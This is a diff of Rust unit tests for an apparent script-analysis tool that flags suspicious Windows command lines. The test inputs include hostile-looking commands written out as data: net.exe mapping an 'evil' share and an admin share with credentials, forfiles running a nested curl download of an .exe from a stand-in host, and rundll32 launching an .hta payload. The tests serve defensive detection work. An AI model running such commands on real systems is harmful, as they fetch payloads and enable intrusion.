@@ -8830,6 +8830,23 @@ rundll32 url.dll,FileProtocolHandler .\Temp\payload.hta"#,
     }
 
     #[test]
+    fn delimiter_prefixed_net_exe_use_dispatches_to_net_handler() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"@;net.exe use Z: \\evil\share"#, &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetUse { info, .. }
+                    if info.devicename.as_deref() == Some("Z:")
+                        && info.server.as_deref() == Some(r#"\\evil\share"#)
+            )),
+            "@;net.exe use was not dispatched to net handler: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_net_alias_use_emits_net_use_trait() {
         let report = analyze(
             br#"copy C:\Windows\System32\net.exe C:\Users\Public\nt.tmp
@@ -8848,6 +8865,33 @@ C:\Users\Public\nt.tmp use Z: \\target.example\C$ /user:DOMAIN\adm pass
                         && info.password.as_deref() == Some("pass")
             )),
             "copied-net use did not emit structured NetUse: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn delimiter_prefixed_forfiles_c_nested_cmd_surfaces_download_trait() {
+        let report = analyze(
+            br#"@;forfiles /m *.txt /c "cmd /c curl -o out.exe https://forfiles-delim.example/p.exe""#,
+            &Config::default(),
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Lolbas { name, .. } if name == "forfiles")),
+            "forfiles LOLBAS trait missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://forfiles-delim.example/p.exe" && dst == "out.exe"
+                )
+            }),
+            "nested forfiles curl download not surfaced: {:?}",
             report.traits
         );
     }
